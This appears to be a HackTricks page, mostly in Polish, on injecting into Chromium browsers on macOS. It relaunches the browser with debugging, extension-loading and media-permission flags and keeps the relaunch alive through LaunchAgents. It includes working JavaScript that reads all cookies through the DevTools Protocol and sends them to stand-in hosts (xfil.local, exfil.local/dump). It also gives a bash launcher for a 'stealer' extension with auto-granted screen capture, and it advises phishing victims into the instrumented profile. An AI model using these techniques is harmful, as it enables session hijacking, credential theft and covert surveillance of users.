# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Przeglądarki oparte na Chromium, takie jak Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, korzystają z tych samych przełączników wiersza poleceń, plików preferencji oraz interfejsów automatyzacji DevTools. Na macOS każdy użytkownik z dostępem do GUI może zakończyć istniejącą sesję przeglądarki i ponownie ją otworzyć z dowolnymi flagami, rozszerzeniami lub punktami końcowymi DevTools działającymi z uprawnieniami docelowego procesu.

#### Uruchamianie Chromium z niestandardowymi flagami na macOS

macOS utrzymuje pojedynczą instancję UI na profil Chromium, więc instrumentacja zwykle wymaga wymuszonego zamknięcia przeglądarki (na przykład za pomocą `osascript -e 'tell application "Google Chrome" to quit'`). Atakujący zazwyczaj ponownie uruchamiają przeglądarkę przez `open -na "Google Chrome" --args <flags>`, aby wstrzyknąć argumenty bez modyfikowania pakietu aplikacji. Umieszczenie tej komendy w LaunchAgent użytkownika (`~/Library/LaunchAgents/*.plist`) lub w login hook gwarantuje, że zmanipulowana przeglądarka zostanie przywrócona po restarcie/wylogowaniu.

#### `--load-extension` Przełącznik

Przełącznik `--load-extension` automatycznie ładuje rozpakowane rozszerzenia (ścieżki rozdzielone przecinkami). Użyj go w połączeniu z `--disable-extensions-except`, aby zablokować legalne rozszerzenia i zmusić do uruchomienia wyłącznie twojego payloadu. Złośliwe rozszerzenia mogą żądać uprawnień wysokiego wpływu, takich jak `debugger`, `webRequest` i `cookies`, aby przejść do protokołów DevTools, poprawiać nagłówki CSP, obniżać zabezpieczenia HTTPS lub wyciągać dane sesji natychmiast po starcie przeglądarki.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Przełączniki

Te przełączniki udostępniają Chrome DevTools Protocol (CDP) przez TCP lub pipe, dzięki czemu zewnętrzne narzędzia mogą sterować przeglądarką. Google odnotowało szerokie nadużycia tego interfejsu przez infostealery i, poczynając od Chrome 136 (marzec 2025), przełączniki są ignorowane dla profilu domyślnego, chyba że przeglądarka zostanie uruchomiona z niestandardowym `--user-data-dir`. To wymusza App-Bound Encryption na prawdziwych profilach, ale atakujący nadal mogą stworzyć nowy profil, skłonić ofiarę do uwierzytelnienia się w nim (phishing/pomoc triage) i zebrać cookies, tokeny, stany zaufania urządzenia lub rejestracje WebAuthn za pomocą CDP.

#### `--user-data-dir` Przełącznik

Ten przełącznik przekierowuje cały profil przeglądarki (History, Cookies, Login Data, pliki Preference itp.) do ścieżki kontrolowanej przez atakującego. Jest to obowiązkowe przy łączeniu nowoczesnych buildów Chrome z `--remote-debugging-port`, a także izoluje zmanipulowany profil, dzięki czemu można wrzucić wstępnie wypełnione pliki `Preferences` lub `Secure Preferences`, które wyłączają monity bezpieczeństwa, automatycznie instalują rozszerzenia i zmieniają domyślne schematy.

#### `--use-fake-ui-for-media-stream` Przełącznik

Ten przełącznik omija monit o pozwolenie na kamerę/mikrofon, więc każda strona wywołująca `getUserMedia` otrzymuje natychmiastowy dostęp. Połącz go z flagami takimi jak `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` lub z poleceniami CDP `Browser.grantPermissions`, aby cicho przechwytywać audio/wideo, udostępniać ekran lub spełniać kontrole związane z WebRTC bez interakcji użytkownika.

## Zdalne debugowanie i nadużycia DevTools Protocol

Po ponownym uruchomieniu Chrome z dedykowanym `--user-data-dir` i `--remote-debugging-port` możesz podłączyć się przez CDP (np. za pomocą `chrome-remote-interface`, `puppeteer` lub `playwright`) i zautomatyzować operacje o wysokich uprawnieniach:

- **Cookie/session theft:** `Network.getAllCookies` i `Storage.getCookies` zwracają wartości HttpOnly nawet wtedy, gdy App-Bound Encryption normalnie blokowałoby dostęp do systemu plików, ponieważ CDP prosi uruchomioną przeglądarkę o ich odszyfrowanie.
- **Permission tampering:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` pozwalają obejść monity kamery/mikrofonu (szczególnie w połączeniu z `--use-fake-ui-for-media-stream`) lub sfałszować sprawdzenia bezpieczeństwa oparte na lokalizacji.
- **Keystroke/script injection:** `Runtime.evaluate` wykonuje dowolny JavaScript w aktywnej karcie, umożliwiając pozyskiwanie poświadczeń, modyfikowanie DOM lub wstrzykiwanie beaconów persystencji, które przetrwają nawigację.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` przechwytują uwierzytelnione żądania/odpowiedzi w czasie rzeczywistym bez zapisywania artefaktów na dysku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Wstrzyknięcie oparte na rozszerzeniu przez Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (rozszerzenia pozostają w swoim kontekście) and enables:

- Ciche kradzieże cookies i poświadczeń za pomocą `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modyfikacja uprawnień witryny (camera, microphone, geolocation) oraz obejście interstitiali bezpieczeństwa, pozwalając stronom phishingowym podszywać się pod dialogi Chrome.
- Modyfikowanie w tranzycie ostrzeżeń TLS, pobrań lub monitów WebAuthn przez programowe sterowanie `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, lub `Security.handleCertificateError`.

Load the extension with `--load-extension`/`--disable-extensions-except` so no user interaction is required. A minimal skrypt w tle that weaponizes the API looks like this:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Rozszerzenie może również subskrybować zdarzenia `Debugger.paused`, aby odczytywać zmienne JavaScript, modyfikować skrypty inline lub ustawiać niestandardowe breakpoints, które przetrwają nawigację. Ponieważ wszystko działa w ramach sesji GUI użytkownika, Gatekeeper i TCC nie są wywoływane, co czyni tę technikę idealną dla malware, które już uzyskało wykonanie w kontekście użytkownika.

### Narzędzia

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatyzuje uruchomienia Chromium z payload extensions i udostępnia interaktywne CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Podobne narzędzie skoncentrowane na traffic interception i browser instrumentation dla operatorów macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteka Node.js do skryptowania zrzutów Chrome DevTools Protocol (cookies, DOM, permissions) gdy instancja z `--remote-debugging-port` jest aktywna.

### Przykład
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Znajdź więcej przykładów w linkach do narzędzi.

## Źródła

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
